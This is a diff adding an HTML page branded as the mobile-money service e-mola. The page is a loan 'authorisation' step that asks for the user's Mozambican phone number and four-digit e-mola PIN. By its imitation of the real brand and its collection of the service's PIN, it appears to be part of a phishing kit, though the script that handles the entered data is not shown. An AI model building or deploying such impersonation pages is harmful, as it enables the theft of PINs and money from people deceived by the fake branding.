@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autorizar - e-mola</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" type="image/png" href="emola-logo.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loading-text" data-t="loading">Processando...</p>
+    </div>
+    <div class="container">
+        <header>
+            <img src="emola-logo.png" alt="e-Mola" style="height: 40px;">
+            <button id="lang-btn" class="lang-btn">
+                <img id="lang-flag" src="https://flagcdn.com/w40/gb.png" alt="Flag">
+                <span id="lang-text">ENG</span>
+            </button>
+        </header>
+
+        <div class="progress-container">
+            <div class="progress-bar" style="width: 85%;"></div>
+        </div>
+
+        <main>
+            <h1 class="page-title" data-t="auth_loan">Autorizar Empréstimo</h1>
+            <p class="page-subtitle" data-t="login_sub">Inicie sessão na sua conta e-mola para autorizar.</p>
+
+            <div class="elite-card">
+                <div class="stat-card" style="padding: 16px; margin-bottom: 24px; text-align: left; background: var(--gray-50);">
+                    <small data-t="auth_reason" style="font-size: 11px; font-weight: 700; color: var(--gray-400); text-transform: uppercase;">Você está autorizando:</small>
+                    <div style="display:flex; justify-content:space-between; margin-top:12px;">
+                        <span data-t="amount" style="font-size: 14px; font-weight: 600; color: var(--gray-600);">Valor:</span>
+                        <strong id="auth-amount" style="color: var(--black);">MZN 0</strong>
+                    </div>
+                    <div style="display:flex; justify-content:space-between;">
+                        <span data-t="total_r" style="font-size: 14px; font-weight: 600; color: var(--gray-600);">Total:</span>
+                        <strong id="auth-total" style="color: var(--brand-orange);">MZN 0</strong>
+                    </div>
+                </div>
+
+<div class="input-group">
+                    <label class="input-label" data-t="phone">Número de Telefone</label>
+                    <div class="phone-input-container">
+                        <div class="phone-prefix">
+                            <img src="https://flagcdn.com/w40/mz.png" alt="MZ">
+                            <span>+258</span>
+                        </div>
+                        <input type="tel" id="login-phone" placeholder="84XXXXXXX">
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label class="input-label" data-t="pin">PIN do e-mola</label>
+                    <input type="password" id="login-pin" class="input-field" placeholder="••••" maxlength="4" inputmode="numeric">
+                </div>
+                
+                <div id="login-error" class="error-banner" data-t="pin_error">PIN incorreto. Por favor, tente novamente.</div>
+                
+                <div class="btn-group">
+                    <button class="btn-elite btn-primary" id="btn-login" onclick="handleLogin()">
+                        <span data-t="login_btn">ENTRAR</span>
+                    </button>
+                    <button class="btn-elite btn-secondary" onclick="navigateTo('review.html')">
+                        <span data-t="back_btn">VOLTAR</span>
+                    </button>
+                </div>
+            </div>
+            
+            <div class="security-badge">
+                <i class="fa-solid fa-copyright"></i>
+                <span>2026 e-mola Financial Services. All rights reserved.</span>
+            </div>
+        </main>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
